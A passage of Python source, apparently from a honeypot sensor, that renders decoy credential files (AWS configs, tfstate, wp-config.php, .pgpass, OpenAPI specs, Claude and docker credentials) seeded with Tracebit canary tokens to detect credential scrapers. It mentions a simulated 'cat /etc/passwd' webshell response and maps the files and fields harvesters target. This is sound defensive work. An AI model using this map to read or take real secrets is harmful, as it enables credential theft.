        _CANARY_CACHE[cache_key] = (expiry, resp)
    return resp


# --- Render functions: (tracebit_response) -> bytes ---

def _aws(r: dict[str, object]) -> dict[str, str]:
    aws = r.get("aws") if isinstance(r, dict) else None
    return aws if isinstance(aws, dict) else {}


def _fake_db_password() -> str:
    # Per-hit synthetic DB password for renderers that embed a plaintext
    # DB cred alongside an AWS canary. NOT a Tracebit-backed canary — a
    # replay against MySQL/Postgres won't fire an alert (Tracebit's
    # gitlab-username-password type only fires against their hosted gitlab
    # URL, which wouldn't be where a wp-config-style probe replays this).
    # The point is to avoid shipping a *fixed literal* across every sensor,
    # which turns into a farm-wide fingerprint.
    return secrets.token_urlsafe(16)


def _gitlab_creds(r: dict[str, object], canary_type: str) -> dict[str, object]:
    http = r.get("http") if isinstance(r, dict) else None
    if not isinstance(http, dict):
        return {}
    details = http.get(canary_type)
    if not isinstance(details, dict):
        return {}
    return details


def render_aws_credentials_ini(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return (
        "[default]\n"
        f"aws_access_key_id = {aws.get('awsAccessKeyId', '')}\n"
        f"aws_secret_access_key = {aws.get('awsSecretAccessKey', '')}\n"
        f"aws_session_token = {aws.get('awsSessionToken', '')}\n"
        "region = us-east-1\n"
    ).encode("utf-8")


def render_openapi_spec(
    r: dict[str, object],
    host: str,
    *,
    yaml: bool = False,
) -> bytes:
    """Plausible OpenAPI 3.0.3 document with the canary embedded in places
    a credential-scraping bot reliably grabs:

      - `components.securitySchemes.bearerAuth.x-example` — bearer token
        examples are scraped by every `openapi-credential-extractor`-class
        tool. We park the AWS access key here as a "dev bearer".
      - `servers[0].variables.adminApiKey.default` — server-variable
        defaults are scraped because Swagger UI dropdowns autocomplete
        them; the AWS secret key lands here.
      - `info.description` — many enumerators do a plain-text key=value
        sweep of the description for `AKIA…` patterns. Same access key
        repeated so substring matches inside markdown find it.

    All three slots point at the same Tracebit issuance. The fake `paths`
    surface advertises plausible admin/auth endpoints so a follow-up
    enumeration walks our handler set (login, /actuator/env, /admin/config).
    `yaml=True` returns the same content as YAML for `/openapi.yaml`."""
    aws = _aws(r)
    access_key = aws.get("awsAccessKeyId", "")
    secret_key = aws.get("awsSecretAccessKey", "")
    safe_host = (host or "api.example.com").split(":", 1)[0] or "api.example.com"
    safe_host = re.sub(r"[^a-zA-Z0-9._-]", "", safe_host) or "api.example.com"
    spec: dict[str, object] = {
        "openapi": "3.0.3",
        "info": {
            "title": "Internal Platform API",
            "version": "1.4.2",
            "description": (
                "Internal REST surface for the platform. Staging access "
                f"uses the bearer token `{access_key}` (rotates "
                "monthly via the deploy pipeline). Production keys are "
                "issued via SSO."
            ),
            "contact": {"name": "Platform Team", "email": "platform@" + safe_host},
        },
        "servers": [
            {
                "url": "https://{host}/api/v1",
                "description": "Production API",
                "variables": {
                    "host": {"default": safe_host},
                    "adminApiKey": {
                        "default": secret_key,
                        "description": "Admin API key (development default)",
                    },
                },
            },
            {
                "url": "https://staging." + safe_host + "/api/v1",
                "description": "Staging API",
            },
        ],
        "components": {
            "securitySchemes": {
                "bearerAuth": {
                    "type": "http",
                    "scheme": "bearer",
                    "bearerFormat": "JWT",
                    "x-example": access_key,
                },
                "apiKeyAuth": {
                    "type": "apiKey",
                    "in": "header",
                    "name": "X-Api-Key",
                    "x-example": access_key,
                },
                "basicAuth": {"type": "http", "scheme": "basic"},
            },
        },
        "security": [{"bearerAuth": []}],
        "paths": {
            "/auth/login": {
                "post": {
                    "summary": "Authenticate a user",
                    "requestBody": {
                        "required": True,
                        "content": {
                            "application/json": {
                                "schema": {
                                    "type": "object",
                                    "properties": {
                                        "username": {"type": "string"},
                                        "password": {"type": "string"},
                                    },
                                    "required": ["username", "password"],
                                },
                            },
                        },
                    },
                    "responses": {
                        "200": {"description": "OK — returns bearer token"},
                        "401": {"description": "Invalid credentials"},
                    },
                },
            },
            "/auth/token": {
                "post": {
                    "summary": "Exchange refresh token",
                    "security": [{"bearerAuth": []}],
                    "responses": {"200": {"description": "OK"}},
                },
            },
            "/admin/users": {
                "get": {
                    "summary": "List users (admin)",
                    "security": [{"bearerAuth": []}],
                    "responses": {
                        "200": {"description": "OK"},
                        "403": {"description": "Forbidden"},
                    },
                },
            },
            "/admin/config": {
                "get": {
                    "summary": "Fetch runtime configuration",
                    "security": [{"bearerAuth": []}],
                    "responses": {"200": {"description": "OK"}},
                },
            },
            "/actuator/env": {
                "get": {
                    "summary": "Spring Boot Actuator env dump",
                    "responses": {"200": {"description": "OK"}},
                },
            },
            "/healthz": {
                "get": {
                    "summary": "Health probe",
                    "responses": {"200": {"description": "OK"}},
                },
            },
        },
    }
    if yaml:
        return _openapi_spec_to_yaml(spec).encode("utf-8")
    return json.dumps(spec, indent=2).encode("utf-8")


def _openapi_spec_to_yaml(spec: dict[str, object]) -> str:
    """Tiny stdlib-only JSON→YAML rendering of the spec dict. Good enough
    for a credential-scraper to grep the `AKIA…` substring out — full PyYAML
    semantics aren't required and bringing PyYAML in for one renderer would
    break flux's stdlib-only invariant."""
    def emit(value: object, indent: int = 0) -> list[str]:
        pad = "  " * indent
        out: list[str] = []
        if isinstance(value, dict):
            if not value:
                return ["{}"]
            for k, v in value.items():
                key = str(k)
                if isinstance(v, (dict, list)) and v:
                    out.append(f"{pad}{key}:")
                    nested = emit(v, indent + 1)
                    out.extend(nested)
                else:
                    rendered = _yaml_scalar(v)
                    out.append(f"{pad}{key}: {rendered}")
            return out
        if isinstance(value, list):
            if not value:
                return [f"{pad}[]"]
            for item in value:
                if isinstance(item, (dict, list)) and item:
                    nested = emit(item, indent + 1)
                    if nested:
                        nested[0] = f"{pad}- " + nested[0].lstrip()
                        out.extend(nested)
                else:
                    out.append(f"{pad}- {_yaml_scalar(item)}")
            return out
        return [f"{pad}{_yaml_scalar(value)}"]
    return "\n".join(emit(spec)) + "\n"


def _yaml_scalar(v: object) -> str:
    if isinstance(v, bool):
        return "true" if v else "false"
    if v is None:
        return "null"
    if isinstance(v, (int, float)):
        return str(v)
    s = str(v)
    if any(c in s for c in ":#\n\"'{}[],&*!|>%@`"):
        return json.dumps(s)
    return s


def render_swagger_ui_html(host: str, spec_url: str = "/swagger.json") -> bytes:
    """Stock Swagger UI bootstrap. References /swagger.json so a scanner
    that fetches the UI then follows the spec lands on `_handle_openapi_swagger`
    again with `spec-json` and receives the canary-bearing document."""
    safe_host = (host or "").split(":", 1)[0]
    safe_host = re.sub(r"[^a-zA-Z0-9._-]", "", safe_host)
    title_host = safe_host or "API"
    return (
        "<!DOCTYPE html>\n"
        "<html lang=\"en\">\n"
        "<head>\n"
        "  <meta charset=\"UTF-8\">\n"
        f"  <title>Swagger UI — {title_host}</title>\n"
        "  <link rel=\"stylesheet\" type=\"text/css\" "
        "href=\"https://unpkg.com/swagger-ui-dist@5/swagger-ui.css\">\n"
        "</head>\n"
        "<body>\n"
        "  <div id=\"swagger-ui\"></div>\n"
        "  <script src=\"https://unpkg.com/swagger-ui-dist@5/swagger-ui-bundle.js\"></script>\n"
        "  <script>\n"
        "    window.onload = function() {\n"
        "      window.ui = SwaggerUIBundle({\n"
        f"        url: \"{spec_url}\",\n"
        "        dom_id: \"#swagger-ui\",\n"
        "        deepLinking: true,\n"
        "        presets: [SwaggerUIBundle.presets.apis],\n"
        "        layout: \"BaseLayout\"\n"
        "      });\n"
        "    };\n"
        "  </script>\n"
        "</body>\n"
        "</html>\n"
    ).encode("utf-8")


def render_redoc_html(host: str, spec_url: str = "/openapi.json") -> bytes:
    """ReDoc bootstrap variant — same role as Swagger UI but the alternative
    renderer scanners check when Swagger UI 404s. Points at /openapi.json."""
    safe_host = (host or "").split(":", 1)[0]
    safe_host = re.sub(r"[^a-zA-Z0-9._-]", "", safe_host)
    title_host = safe_host or "API"
    return (
        "<!DOCTYPE html>\n"
        "<html>\n"
        "<head>\n"
        "  <meta charset=\"utf-8\">\n"
        f"  <title>API Documentation — {title_host}</title>\n"
        "  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n"
        "</head>\n"
        "<body>\n"
        f"  <redoc spec-url=\"{spec_url}\"></redoc>\n"
        "  <script src=\"https://cdn.jsdelivr.net/npm/redoc@next/bundles/redoc.standalone.js\"></script>\n"
        "</body>\n"
        "</html>\n"
    ).encode("utf-8")


def render_fake_passwd() -> bytes:
    """Static `/etc/passwd`-shape body. Same content as the webshell trap's
    `cat /etc/passwd` simulation — kept identical so a scanner that probes
    both endpoints sees a consistent host."""
    return (
        "root:x:0:0:root:/root:/bin/bash\n"
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
        "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n"
        "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
        "mysql:x:112:116:MySQL Server,,,:/nonexistent:/bin/false\n"
    ).encode("utf-8")


def render_printenv_dump(r: dict[str, object], *, host: str = "") -> bytes:
    """Plausible `printenv`/CGI-environment block with AWS_* values bound to
    a Tracebit canary. Synthesised non-credential context (hostname, PWD,
    PATH, USER) keeps the shape recognisable; the canary lives in AWS_*
    only — a replay against AWS fires Tracebit."""
    aws = _aws(r)
    safe_host = (host or "web-01").split(":", 1)[0] or "web-01"
    safe_host = re.sub(r"[^a-zA-Z0-9._-]", "", safe_host) or "web-01"
    db_pw = _fake_db_password()
    lines = [
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        f"HOSTNAME={safe_host}",
        "USER=www-data",
        "HOME=/var/www",
        "PWD=/var/www/html",
        "SHELL=/bin/bash",
        "LANG=C.UTF-8",
        "SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)",
        "SERVER_NAME=" + safe_host,
        "SERVER_PORT=443",
        "GATEWAY_INTERFACE=CGI/1.1",
        "REQUEST_METHOD=GET",
        f"AWS_ACCESS_KEY_ID={aws.get('awsAccessKeyId', '')}",
        f"AWS_SECRET_ACCESS_KEY={aws.get('awsSecretAccessKey', '')}",
        f"AWS_SESSION_TOKEN={aws.get('awsSessionToken', '')}",
        "AWS_DEFAULT_REGION=us-east-1",
        f"DATABASE_URL=postgres://app:{db_pw}@db.internal:5432/app_prod",
        "RAILS_ENV=production",
        "NODE_ENV=production",
    ]
    return ("\n".join(lines) + "\n").encode("utf-8")


def render_aws_config_ini(r: dict[str, object]) -> bytes:
    # `~/.aws/config` is the sibling of `~/.aws/credentials`: region / output
    # format / profile definitions. Some SDK setups stash the access key here
    # too (in-profile `aws_access_key_id`), so embedding the canary is valid.
    aws = _aws(r)
    return (
        "[default]\n"
        "region = us-east-1\n"
        "output = json\n"
        f"aws_access_key_id = {aws.get('awsAccessKeyId', '')}\n"
        f"aws_secret_access_key = {aws.get('awsSecretAccessKey', '')}\n"
        "\n"
        "[profile prod]\n"
        "region = us-east-1\n"
        "output = json\n"
        f"aws_session_token = {aws.get('awsSessionToken', '')}\n"
    ).encode("utf-8")


def render_terraform_tfstate(r: dict[str, object]) -> bytes:
    # `terraform.tfstate` is the JSON snapshot Terraform writes when applying
    # against a non-remote backend. Provider credentials and resource IDs end
    # up in plaintext under `resources[].instances[].attributes`, so an
    # exposed tfstate is a one-shot AWS/GCP/Azure credential leak — exactly
    # the value scanners are after.
    #
    # Two design choices worth a comment:
    #
    # 1. `lineage` (uuid) and `serial` (monotonic int) are emitted random
    #    per-hit. Real tfstates have a stable lineage per state file; here
    #    they vary per request because every fetch should look like an
    #    independent leak (a fixed lineage across the fleet would itself be
    #    a fingerprint).
    #
    # 2. The canary AWS access key + secret are placed both in an
    #    `aws_iam_access_key` resource (where Terraform actually stores them)
    #    and in a top-level `outputs` block. Some scrapers extract via
    #    `outputs[].value`, others walk `resources[]`; covering both shapes
    #    means a field-keyed harvester catches the canary either way.
    aws = _aws(r)
    access_key = aws.get("awsAccessKeyId", "")
    secret_key = aws.get("awsSecretAccessKey", "")
    state = {
        "version": 4,
        "terraform_version": "1.7.5",
        "serial": secrets.randbelow(900) + 100,
        "lineage": str(uuid.uuid4()),
        "outputs": {
            "deploy_access_key_id": {
                "value": access_key,
                "type": "string",
            },
            "deploy_secret_access_key": {
                "value": secret_key,
                "type": "string",
                "sensitive": True,
            },
        },
        "resources": [
            {
                "mode": "managed",
                "type": "aws_iam_access_key",
                "name": "deploy",
                "provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
                "instances": [
                    {
                        "schema_version": 0,
                        "attributes": {
                            "id": access_key,
                            "user": "deploy",
                            "secret": secret_key,
                            "status": "Active",
                            "create_date": "2024-08-01T00:00:00Z",
                            "pgp_key": "",
                            "key_fingerprint": "",
                        },
                        "sensitive_attributes": [],
                    },
                ],
            },
            {
                "mode": "managed",
                "type": "aws_s3_bucket",
                "name": "primary",
                "provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
                "instances": [
                    {
                        "schema_version": 0,
                        "attributes": {
                            "id": "app-prod-data",
                            "bucket": "app-prod-data",
                            "region": "us-east-1",
                            "arn": "arn:aws:s3:::app-prod-data",
                        },
                        "sensitive_attributes": [],
                    },
                ],
            },
        ],
        "check_results": None,
    }
    return (json.dumps(state, indent=2) + "\n").encode("utf-8")


# ---- Niche cloud-provider credential files --------------------------------
# A growing population of credential-scanner tools enumerates config files
# for smaller cloud providers alongside mainstream AWS/GCP/Azure paths.
# Each renderer below produces a format-accurate file with the Tracebit
# AWS canary embedded in the field a credential-extractor would grab.


def render_oci_config(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return (
        "[DEFAULT]\n"
        "user=ocid1.user.oc1..aaaaaaaaexample\n"
        "fingerprint=ab:cd:ef:01:23:45:67:89:ab:cd:ef:01:23:45:67:89\n"
        f"key_file=~/.oci/oci_api_key.pem\n"
        "tenancy=ocid1.tenancy.oc1..aaaaaaaaexample\n"
        "region=us-ashburn-1\n"
        f"pass_phrase={aws.get('awsSecretAccessKey', '')}\n"
    ).encode("utf-8")


def render_oci_api_key_pem(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    tag = aws.get("awsAccessKeyId", "") + aws.get("awsSecretAccessKey", "")
    fake_b64 = base64.b64encode(tag.encode() + secrets.token_bytes(128)).decode()
    lines = [fake_b64[i:i + 64] for i in range(0, len(fake_b64), 64)]
    return (
        "-----BEGIN RSA PRIVATE KEY-----\n"
        + "\n".join(lines) + "\n"
        "-----END RSA PRIVATE KEY-----\n"
    ).encode("utf-8")


def render_hcloud_toml(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return (
        "active_context = \"prod\"\n"
        "\n"
        "[[contexts]]\n"
        "name = \"prod\"\n"
        f"token = \"{aws.get('awsSecretAccessKey', '')}\"\n"
    ).encode("utf-8")


def render_civo_json(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return json.dumps({
        "apikeys": {
            "prod": {
                "key": aws.get("awsSecretAccessKey", ""),
                "name": "prod",
            },
        },
        "meta": {
            "current_api_key": "prod",
            "default_region": "LON1",
        },
    }, indent=2).encode("utf-8")


def render_exoscale_toml(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return (
        "defaultaccount = \"prod\"\n"
        "\n"
        "[[accounts]]\n"
        "account = \"prod\"\n"
        "endpoint = \"https://api.exoscale.com/v1\"\n"
        "environment = \"api\"\n"
        f"key = \"{aws.get('awsAccessKeyId', '')}\"\n"
        f"secret = \"{aws.get('awsSecretAccessKey', '')}\"\n"
    ).encode("utf-8")


def render_scaleway_config_yaml(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return (
        f"access_key: {aws.get('awsAccessKeyId', '')}\n"
        f"secret_key: {aws.get('awsSecretAccessKey', '')}\n"
        "default_organization_id: aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee\n"
        "default_project_id: aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee\n"
        "default_region: fr-par\n"
        "default_zone: fr-par-1\n"
    ).encode("utf-8")


def render_fly_auth_yml(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return (
        f"access_token: {aws.get('awsSecretAccessKey', '')}\n"
    ).encode("utf-8")


def render_ovh_conf(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return (
        "[default]\n"
        "endpoint=ovh-eu\n"
        f"application_key={aws.get('awsAccessKeyId', '')}\n"
        f"application_secret={aws.get('awsSecretAccessKey', '')}\n"
        f"consumer_key={aws.get('awsSessionToken', '')}\n"
    ).encode("utf-8")


def render_openstack_clouds_yaml(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return (
        "clouds:\n"
        "  prod:\n"
        "    auth:\n"
        "      auth_url: https://identity.api.example.com/v3\n"
        f"      application_credential_id: {aws.get('awsAccessKeyId', '')}\n"
        f"      application_credential_secret: {aws.get('awsSecretAccessKey', '')}\n"
        "    region_name: RegionOne\n"
        "    interface: public\n"
        "    identity_api_version: 3\n"
        "    auth_type: v3applicationcredential\n"
    ).encode("utf-8")


def render_terraform_credentials_tfrc_json(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return json.dumps({
        "credentials": {
            "app.terraform.io": {
                "token": aws.get("awsSecretAccessKey", ""),
            },
        },
    }, indent=2).encode("utf-8")


def render_pulumi_credentials_json(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return json.dumps({
        "current": "https://api.pulumi.com",
        "accessTokens": {
            "https://api.pulumi.com": aws.get("awsSecretAccessKey", ""),
        },
        "accounts": {
            "https://api.pulumi.com": {
                "accessToken": aws.get("awsSecretAccessKey", ""),
                "username": "deploy",
                "lastValidatedAt": "2025-01-15T00:00:00Z",
            },
        },
    }, indent=2).encode("utf-8")


def render_doctl_config_yaml(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return (
        f"access-token: {aws.get('awsSecretAccessKey', '')}\n"
        "context: default\n"
        "output: text\n"
    ).encode("utf-8")


def render_linode_cli(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return (
        "[DEFAULT]\n"
        "default-user = deploy\n"
        "\n"
        "[deploy]\n"
        f"token = {aws.get('awsSecretAccessKey', '')}\n"
        "region = us-east\n"
        "type = g6-standard-2\n"
        "image = linode/ubuntu22.04\n"
    ).encode("utf-8")


def render_terraformrc(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return (
        "credentials \"app.terraform.io\" {\n"
        f"  token = \"{aws.get('awsSecretAccessKey', '')}\"\n"
        "}\n"
    ).encode("utf-8")


def render_s3cfg(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return (
        "[default]\n"
        f"access_key = {aws.get('awsAccessKeyId', '')}\n"
        f"secret_key = {aws.get('awsSecretAccessKey', '')}\n"
        "host_base = s3.amazonaws.com\n"
        "host_bucket = %(bucket)s.s3.amazonaws.com\n"
        "use_https = True\n"
    ).encode("utf-8")


def render_passwd_s3fs(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return (
        f"{aws.get('awsAccessKeyId', '')}:{aws.get('awsSecretAccessKey', '')}\n"
    ).encode("utf-8")


def render_cargo_credentials(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return (
        "[registry]\n"
        f"token = \"{aws.get('awsSecretAccessKey', '')}\"\n"
    ).encode("utf-8")


def render_gem_credentials(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return (
        "---\n"
        f":rubygems_api_key: {aws.get('awsSecretAccessKey', '')}\n"
    ).encode("utf-8")


def render_gh_hosts_yml(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return (
        "github.com:\n"
        f"  oauth_token: {aws.get('awsSecretAccessKey', '')}\n"
        "  user: deploy\n"
        "  git_protocol: https\n"
    ).encode("utf-8")


def render_1password_config(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return json.dumps({
        "latest_signin": "my.1password.com",
        "accounts": [
            {
                "shorthand": "my",
                "url": "https://my.1password.com",
                "email": "deploy@example.com",
                "accountKey": aws.get("awsSecretAccessKey", ""),
                "userUUID": str(uuid.uuid4()),
            },
        ],
    }, indent=2).encode("utf-8")


def render_cloudflared_config_yml(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return (
        f"tunnel: {uuid.uuid4()}\n"
        f"credentials-file: /etc/cloudflared/{uuid.uuid4()}.json\n"
        f"secret: {aws.get('awsSecretAccessKey', '')}\n"
        "ingress:\n"
        "  - hostname: app.example.com\n"
        "    service: http://localhost:8080\n"
        "  - service: http_status:404\n"
    ).encode("utf-8")


def render_wireguard_conf(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    fake_key = base64.b64encode(secrets.token_bytes(32)).decode()
    return (
        "[Interface]\n"
        f"PrivateKey = {fake_key}\n"
        "Address = 10.0.0.2/24\n"
        "DNS = 1.1.1.1\n"
        "\n"
        "[Peer]\n"
        f"PublicKey = {base64.b64encode(secrets.token_bytes(32)).decode()}\n"
        f"PresharedKey = {aws.get('awsSecretAccessKey', '')}\n"
        "Endpoint = vpn.example.com:51820\n"
        "AllowedIPs = 0.0.0.0/0\n"
    ).encode("utf-8")


def render_headscale_config_yaml(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return (
        "server_url: https://headscale.example.com\n"
        f"private_key: {aws.get('awsSecretAccessKey', '')}\n"
        "noise:\n"
        f"  private_key: {_fake_db_password()}\n"
        "ip_prefixes:\n"
        "  - 100.64.0.0/10\n"
        "derp:\n"
        "  urls:\n"
        "    - https://controlplane.tailscale.com/derpmap/default\n"
        "  auto_update_enabled: true\n"
    ).encode("utf-8")


def render_pgpass(r: dict[str, object]) -> bytes:
    # Postgres `.pgpass` format: one line per entry, colon-separated
    # hostname:port:database:username:password. libpq reads this file if it
    # exists and mode 0600. Harvesters typically grep the whole file, so
    # a single plausible line is enough to elicit a follow-up.
    creds = _gitlab_creds(r, "gitlab-username-password").get("credentials") or {}
    if not isinstance(creds, dict):
        creds = {}
    username = str(creds.get("username", "") or "deploy")
    password = str(creds.get("password", "") or "")
    return (
        f"db.internal:5432:app_prod:{username}:{password}\n"
        f"db-replica.internal:5432:*:{username}:{password}\n"
    ).encode("utf-8")


# Bcrypt-output alphabet: A-Za-z0-9./ (per the OpenBSD bcrypt encoding).
# We never compute a real bcrypt — scanners can't reverse the hash anyway,
# and the credentials they replay are the *usernames*. The hash is shaped
# so format-aware parsers (e.g. apache's htpasswd -v, Python's passlib)
# accept the line without erroring out.
_BCRYPT_ALPHABET = string.ascii_letters + string.digits + "./"


def _fake_bcrypt_hash() -> str:
    # `$2y$10$` + 22-char salt + 31-char hash = bcrypt shape ($2y is the
    # Apache/PHP variant; $2b is the canonical OpenBSD variant — scanners
    # accept both).
    salt = "".join(secrets.choice(_BCRYPT_ALPHABET) for _ in range(22))
    digest = "".join(secrets.choice(_BCRYPT_ALPHABET) for _ in range(31))
    return f"$2y$10${salt}{digest}"


def render_htpasswd(r: dict[str, object]) -> bytes:
    # Apache `.htpasswd` format: `username:hash` lines, hash is one of
    # bcrypt (`$2y$10$...`), apr1 (`$apr1$...$...`), SHA (`{SHA}...`), or
    # crypt (DES, 13 chars). Modern deployments default to bcrypt.
    # Per-hit hashes prevent the file from becoming a fleet-wide
    # fingerprint; the canary value is the *username* — scanners that
    # crack the hash and replay the credential pair against the issuer's
    # tracking surface fire the alert.
    creds = _gitlab_creds(r, "gitlab-username-password").get("credentials") or {}
    if not isinstance(creds, dict):
        creds = {}
    canary_user = str(creds.get("username", "") or "deploy")
    return (
        f"{canary_user}:{_fake_bcrypt_hash()}\n"
        f"admin:{_fake_bcrypt_hash()}\n"
        f"backup:{_fake_bcrypt_hash()}\n"
    ).encode("utf-8")


def render_claude_credentials_json(r: dict[str, object]) -> bytes:
    # Claude Code stores its OAuth tokens at `~/.claude/.credentials.json`.
    # Scanner dictionaries added this path in April 2026 shortly after
    # Claude Code's rollout — tracker-kits follow new developer tooling.
    # Same caveat as the other AI-credential traps: Tracebit Community has
    # no LLM canary type yet, so we embed an AWS canary under
    # Anthropic-shaped field names. A grep-by-field harvester will still
    # serialize the value; a prefix-filter scanner (`sk-ant-...`) will
    # correctly decide the key is fake and drop it. Either way, the probe
    # itself is the intel we want.
    aws = _aws(r)
    return json.dumps({
        "claudeAiOauth": {
            "accessToken": aws.get("awsAccessKeyId", ""),
            "refreshToken": aws.get("awsSecretAccessKey", ""),
            "expiresAt": aws.get("awsExpiration", ""),
            "scopes": ["user:inference", "user:profile"],
            "subscriptionType": "max",
        },
    }, indent=2).encode("utf-8")


def render_wp_config_php(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    db_password = _fake_db_password()
    return (
        "<?php\n"
        "/** MySQL settings */\n"
        "define('DB_NAME', 'wordpress');\n"
        "define('DB_USER', 'wp_prod');\n"
        f"define('DB_PASSWORD', '{db_password}');\n"
        "define('DB_HOST', 'db.internal:3306');\n"
        "define('DB_CHARSET', 'utf8mb4');\n"
        "\n"
        "/** AWS settings for media uploads + nightly backups */\n"
        f"define('AWS_ACCESS_KEY_ID', '{aws.get('awsAccessKeyId', '')}');\n"
        f"define('AWS_SECRET_ACCESS_KEY', '{aws.get('awsSecretAccessKey', '')}');\n"
        f"define('AWS_SESSION_TOKEN', '{aws.get('awsSessionToken', '')}');\n"
        "define('AWS_DEFAULT_REGION', 'us-east-1');\n"
        "define('S3_UPLOADS_BUCKET', 'wp-uploads-prod');\n"
        "\n"
        "$table_prefix = 'wp_';\n"
        "define('WP_DEBUG', false);\n"
        "if (!defined('ABSPATH')) { define('ABSPATH', __DIR__ . '/'); }\n"
        "require_once ABSPATH . 'wp-settings.php';\n"
    ).encode("utf-8")


def render_sql_dump(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    ts = datetime.now(UTC).strftime("%Y-%m-%d %H:%M:%S")
    return (
        "-- MySQL dump 10.13  Distrib 8.0.35\n"
        f"-- Host: db.internal    Database: wp_prod\n"
        f"-- Dumped at: {ts}\n"
        "--\n"
        "-- S3 backup credentials (rotate via Vault; see INFRA-412):\n"
        f"--   AWS_ACCESS_KEY_ID={aws.get('awsAccessKeyId', '')}\n"
        f"--   AWS_SECRET_ACCESS_KEY={aws.get('awsSecretAccessKey', '')}\n"
        f"--   AWS_SESSION_TOKEN={aws.get('awsSessionToken', '')}\n"
        "--\n"
        "\n"
        "LOCK TABLES `wp_options` WRITE;\n"
        "INSERT INTO `wp_options` VALUES (1,'siteurl','https://shop.internal-tools.lan','yes');\n"
        "INSERT INTO `wp_options` VALUES (2,'blogname','Internal Tools','yes');\n"
        "INSERT INTO `wp_options` VALUES (3,'admin_email','ops@internal-tools.lan','yes');\n"
        "INSERT INTO `wp_options` VALUES (4,'s3_backup_bucket','wp-backups-prod','yes');\n"
        f"INSERT INTO `wp_options` VALUES (5,'s3_access_key','{aws.get('awsAccessKeyId', '')}','no');\n"
        f"INSERT INTO `wp_options` VALUES (6,'s3_secret_key','{aws.get('awsSecretAccessKey', '')}','no');\n"
        "UNLOCK TABLES;\n"
    ).encode("utf-8")


def render_config_json(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return json.dumps({
        "app": "internal-tools",
        "env": "production",
        "aws": {
            "access_key_id": aws.get("awsAccessKeyId", ""),
            "secret_access_key": aws.get("awsSecretAccessKey", ""),
            "session_token": aws.get("awsSessionToken", ""),
            "region": "us-east-1",
        },
        "features": {"s3_uploads": True, "dynamodb_sessions": True},
    }, indent=2).encode("utf-8")


def render_sftp_config_json(r: dict[str, object]) -> bytes:
    """`.vscode/sftp.json` (or `sftp-config.json` for Sublime SFTP).
    Editor extensions store SFTP deploy creds in plaintext at the project
    root; scanners hunt every plausible filename. The 'password' field
    here is the gitlab-username-password Tracebit canary, so a replay
    against the canary's hosted gitlab URL fires the alert."""
    creds = _gitlab_creds(r, "gitlab-username-password").get("credentials") or {}
    if not isinstance(creds, dict):
        creds = {}
    username = str(creds.get("username", "") or "deploy")
    password = str(creds.get("password", "") or "")
    return json.dumps({
        "name": "production",
        "host": "deploy.internal",
        "protocol": "sftp",
        "port": 22,
        "username": username,
        "password": password,
        "remotePath": "/var/www/app",
        "uploadOnSave": True,
        "useTempFile": False,
        "openSsh": False,
        "ignore": [".git", ".vscode", "node_modules"],
    }, indent=2).encode("utf-8")


def render_firebase_json(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    # We only have AWS canaries from Tracebit Community today. Shape this
    # like a service-account file but label keys in a way that still looks
    # plausible to a grep-based scanner.
    return json.dumps({
        "type": "service_account",
        "project_id": "internal-tools-prod",
        "private_key_id": aws.get("awsAccessKeyId", ""),
        "private_key": f"-----BEGIN PRIVATE KEY-----\n{aws.get('awsSecretAccessKey', '')}\n-----END PRIVATE KEY-----\n",
        "client_email": "deployer@internal-tools-prod.iam.gserviceaccount.com",
        "token_uri": "https://oauth2.googleapis.com/token",
        "aws_session_token": aws.get("awsSessionToken", ""),
    }, indent=2).encode("utf-8")


def render_docker_config(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    import base64
    auth = base64.b64encode(
        f"AWS:{aws.get('awsSecretAccessKey', '')}".encode("utf-8"),
    ).decode("ascii")
    return json.dumps({
        "auths": {
            "123456789012.dkr.ecr.us-east-1.amazonaws.com": {
                "auth": auth,
                "identitytoken": aws.get("awsSessionToken", ""),
            },
        },
        "credsStore": "ecr-login",
        "HttpHeaders": {"User-Agent": "Docker-Client/24.0.7 (linux)"},
    }, indent=2).encode("utf-8")


def render_docker_compose_yml(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    return (
        "version: '3.9'\n"
        "services:\n"
        "  web:\n"
        "    image: internal/tools:prod\n"
        "    environment:\n"
        f"      AWS_ACCESS_KEY_ID: {aws.get('awsAccessKeyId', '')}\n"
        f"      AWS_SECRET_ACCESS_KEY: {aws.get('awsSecretAccessKey', '')}\n"
        f"      AWS_SESSION_TOKEN: {aws.get('awsSessionToken', '')}\n"
